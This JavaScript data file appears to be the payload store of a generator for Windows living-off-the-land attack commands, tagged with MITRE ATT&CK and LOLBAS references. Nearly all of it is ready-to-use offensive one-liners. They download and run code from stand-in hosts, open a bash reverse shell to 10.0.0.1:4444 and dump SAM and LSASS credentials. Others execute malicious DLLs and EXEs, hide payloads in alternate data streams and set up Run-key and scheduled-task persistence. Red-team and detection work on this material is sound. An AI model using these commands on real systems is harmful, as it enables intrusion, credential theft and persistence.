/**
 * All payloads are stored here. This data is used for generating payloads from the options selected by users.
 * 
 * Schema:
 * {
 *      Purpose: {
 *          Binary: {
 *              Command: String,
 *              Cli: String?,
 *              AdminRequired: Bool,
 *              MitreAtt&ck: {
 *                  ID: String,
 *                  URL: String,
 *              }?,
 *              LOLBAS: String?,
 *          }
 *      }
 * }
 */
const PAYLOADS = {
    'Copy': {
        'Bitsadmin': {
            'cmd': 'bitsadmin /CREATE 1;bitsadmin /ADDFILE 1 C:\\Windows\\System32\\calc.exe C:\\calc.exe;bitsadmin /RESUME 1;bitsadmin /COMPLETE 1;bitsadmin /RESET',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Wmic': {
            'cmd': 'wmic datafile where "Name=\'C:\\Windows\\System32\\calc.exe\'" call Copy "C:\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        }
    },
    'Download': {
        'Certutil': {
            'cmd': 'certutil -urlcache -split -f http://example.com/evil.exe .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/',
            'desc': null,
        },
        'PowerShell': {
            'cmd': 'iwr -uri http://example.com/evil.exe -outfile .\\evil.exe',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, call "powershell" before the above command such as "powershell -nop iwr -uri ..."',
        },
        'Mshta': {
            'cmd': 'mshta https://evil.com/evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': null,
        },
    },
    'Download & Execute': {
        'PowerShell': {
            'cmd': 'IEX((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Commnad Prompt, call "powershell" before the above command such as "powershell -nop -c \"IEX((...".',
        },
    },
    'Dump Credentials': {
        'Reg': {
            'cmd': 'reg save HKLM\\SECURITY .\\security.bak;reg save HKLM\\SYSTEM .\\system.bak;reg save HKLM\\SAM .\\sam.bak',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Reg/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Rundll32': {
            'cmd': 'rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump <LSASS_PID> C:\\lsass.dmp full',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'<LSASS_PID>\' with actual PID of "lsass.exe". To find it, use \'Get-Process\' or \'tasklist\' command.',
        },
    },
    'Execute': {
        'Bash': {
            'cmd': 'bash -c "echo hello"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Bash (Reverse Shell)': {
            'cmd': 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Mshta': {
            'cmd': 'mshta C:\\evil.hta',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'This command executes arbitrary JavaScript code in the .hta file. The .hta file must consist of HTML source code.',
        },
        'Shell32': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': null,
        },
    },
    'Execute DLL': {
        'Netsh': {
            'cmd': 'netsh add helper C:\\evil.dll',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1546.007', 'url': 'https://attack.mitre.org/techniques/T1546/007/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
            'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run. This method is also used for establishing persistence.'
        },
        'Rundll32': {
            'cmd': 'rundll32 evil.dll,EntryPoint',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'EntryPoint\' with the entry point of the DLL such as "DllMain" or other exported function marked with \'__declspec(dllexport)\'.',
        },
        'Shell32': {
            'cmd': 'rundll32 shell32.dll,Control_RunDLL C:\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': null,
        },
    },
    'Execute EXE': {
        'Bash': {
            'cmd': 'bash -c evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Conhost 1': {
            'cmd': 'conhost evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Conhost 2': {
            'cmd': 'conhost --headless evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Explorer 1': {
            'cmd': 'explorer C:\\Windows\\System32\\calc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'Explorer 2': {
            'cmd': 'explorer /root,"C:\\Windows\\System32\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'Rundll32': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': null,
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC MINUTE /MO 1 /TN "My Task" /TR C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': 'The above command adds the task that executes arbitrary .exe file every minute.',
        },
        'Wmic': {
            'cmd': 'wmic process call create calc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
    },
    'Execute Hidden Files': {
        'Cmd': {
            'cmd': 'cmd /c start "" "file.docx:payload.bat"',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': null,
        },
        'Mshta': {
            'cmd': 'mshta "C:\\file.txt:evil.hta"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'The above command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
        },
        'Wmic': {
            'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
    },
    'Hide Files': {
        'Cmd': {
            'cmd': 'cmd /c echo regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll > file.docx:payload.bat',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': 'The above command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
        }
    },
    'Persistence': {
        'Reg (Unprivileged)': {
            'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': null,
        },
        'Reg (Privileged)': {
            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': null,
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\\evil.exe /RU SYSTEM',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': null,
        },
    },
};
